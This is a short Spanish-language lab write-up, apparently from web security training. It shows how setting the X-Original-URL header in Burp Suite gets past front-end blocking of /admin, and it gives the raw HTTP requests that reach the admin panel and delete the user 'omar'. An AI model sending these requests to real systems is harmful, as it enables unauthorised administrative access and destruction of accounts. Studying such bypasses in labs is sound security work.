# Bypass de control por URL

Tags: #AccessControl #BurpSuite 

```bash 
En este lab, el sistema bloquea el acceso directo a /admin, pero al modificar la cabecera 'X-Original-URL' desde Burp, el backend interpreta esta ruta ignorando el filtrado del frontend. Se aprovecha esta característica para acceder primero al panel y luego se invoca '/admin/delete?username=omar' usando la misma técnica para eliminar al usuario.


- X-Original-URL: Se usa en muchas arquitecturas web para preservar la URL original solicitada por el cliente, especialmente cuando hay un proxy, balanceador o middleware que modifica, reescribe o redirige la URL internamente antes de llegar al backend.  
```

```bash 
# Colocar la cabecera en la solicitud original para ver si es interpretada 
	GET /  HTTP/2
	X-Original-URL: /test        # El backend interpreta la cabecera con la ruta como admin


# Colocar la ruta 
	GET /  HTTP/2
	X-Original-URL: /admin


# Forma final cuando existe un parámetro para ejecutar la acción 
	GET /?username=omar  HTTP/2
	X-Original-URL: /admin/delete
```